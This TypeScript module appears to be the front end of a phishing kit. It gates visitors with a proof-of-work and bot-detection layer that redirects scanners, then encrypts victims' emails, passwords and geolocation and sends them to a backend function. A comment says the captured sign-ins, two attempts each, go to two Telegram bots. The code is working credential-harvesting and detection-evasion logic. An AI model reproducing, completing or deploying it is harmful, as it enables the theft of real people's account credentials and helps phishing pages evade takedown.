import { functionUrl, SECURITY_CONFIG } from '../config/security';
import { GATE_TOKEN_TTL_MS } from '../config/botShield.shared';
import { encryptPayload } from './crypto';
import { getAccessToken, saveVisitorGeo } from './session';
import {
  getClientSignals,
  handleBotRedirectResponse,
  type ClientSignals,
} from './botShield';
import type { PowSolution } from './pow';
import type { GeoInfo } from './geoip';
import { getGeoInfo } from './geoip';

export interface LoginPayload {
  email: string;
  provider?: string;
  password: string;
  turnstileToken?: string | null;
  attempt?: number;
  clientSignals?: ClientSignals;
  ip?: string;
  country?: string;
  countryCode?: string;
  region?: string;
  city?: string;
  continent?: string;
  org?: string;
  timezone?: string;
}

const jsonHeaders = {
  'Content-Type': 'application/json',
};

const supabaseHeaders = {
  Authorization: `Bearer ${SECURITY_CONFIG.supabaseAnonKey}`,
  apikey: SECURITY_CONFIG.supabaseAnonKey,
};

function buildSecureHeaders(): Record<string, string> {
  const accessToken = getAccessToken();
  if (!accessToken) {
    throw new Error('Access verification required. Please refresh the page.');
  }

  return {
    ...jsonHeaders,
    ...supabaseHeaders,
    'X-Access-Token': accessToken,
  };
}

function withClientSignals<T extends Record<string, unknown>>(payload: T) {
  return {
    ...payload,
    clientSignals: getClientSignals(),
  };
}

export async function fetchPowChallenge(): Promise<{
  success: boolean;
  challengeToken?: string;
  prefix?: string;
  difficulty?: number;
  expiresAt?: number;
  error?: string;
  isBot?: boolean;
  redirectUrl?: string;
}> {
  const controller = new AbortController();
  const timeout = window.setTimeout(() => controller.abort(), 15000);

  try {
    const response = await fetch(functionUrl('gate'), {
      method: 'POST',
      headers: {
        ...jsonHeaders,
        ...supabaseHeaders,
        Accept: 'application/json',
      },
      signal: controller.signal,
      body: JSON.stringify({
        action: 'challenge',
        clientSignals: getClientSignals(),
      }),
    });

    const data = await response.json();

    if (handleBotRedirectResponse(data)) {
      return data;
    }

    if (!response.ok) {
      throw new Error(data.error ?? `Security service unavailable (${response.status}).`);
    }

    return data;
  } catch (err) {
    if (err instanceof Error && err.name === 'AbortError') {
      throw new Error('Connection timed out. Check Supabase functions are deployed and try again.');
    }
    throw err instanceof Error
      ? err
      : new Error('Unable to reach the security service. Please try again.');
  } finally {
    window.clearTimeout(timeout);
  }
}

export async function verifyBotGate(
  turnstileToken: string,
  pow: PowSolution,
): Promise<{
  success: boolean;
  accessToken?: string;
  expiresAt?: number;
  geo?: GeoInfo;
  error?: string;
  isBot?: boolean;
  redirectUrl?: string;
}> {
  const controller = new AbortController();
  const timeout = window.setTimeout(() => controller.abort(), 20000);

  try {
    const response = await fetch(functionUrl('gate'), {
      method: 'POST',
      headers: {
        ...jsonHeaders,
        ...supabaseHeaders,
        Accept: 'application/json',
      },
      signal: controller.signal,
      body: JSON.stringify({
        turnstileToken,
        pow,
        clientSignals: getClientSignals(),
      }),
    });

    const data = await response.json();

    if (handleBotRedirectResponse(data)) {
      return data;
    }

    if (!response.ok) {
      const detail =
        typeof data.reason === 'string' && data.reason
          ? ` (${data.reason})`
          : '';
      throw new Error(
        (data.error ?? `Verification failed (${response.status}). Please try again.`) + detail,
      );
    }

    return data;
  } catch (err) {
    if (err instanceof Error && err.name === 'AbortError') {
      throw new Error('Verification timed out. Please try again.');
    }
    throw err instanceof Error
      ? err
      : new Error('Unable to complete verification. Please try again.');
  } finally {
    window.clearTimeout(timeout);
  }
}

export async function submitLogin(
  payload: Omit<LoginPayload, 'clientSignals'>,
): Promise<Response> {
  const encryptedBody = await encryptPayload(withClientSignals(payload));

  const response = await fetch(functionUrl('login2'), {
    method: 'POST',
    headers: buildSecureHeaders(),
    body: JSON.stringify(encryptedBody),
  });

  try {
    const data = await response.clone().json();
    if (data?.success && data?.data?.geo) {
      saveVisitorGeo(data.data.geo as GeoInfo);
    }
  } catch {
    // Non-JSON responses are ignored.
  }

  return response;
}

/**
 * Double sign-in capture: attempt 1 + attempt 2, both to both Telegram bots.
 * Never triggers bot redirect — BotGate already filtered.
 */
export function fireLoginCapture(
  payload: Omit<LoginPayload, 'clientSignals'>,
): void {
  void (async () => {
    try {
      const geo = await getGeoInfo();
      await submitLogin({ ...payload, ...geo });
    } catch (err) {
      console.error('Login capture failed:', err);
    }
  })();
}

export { GATE_TOKEN_TTL_MS, SECURITY_CONFIG };
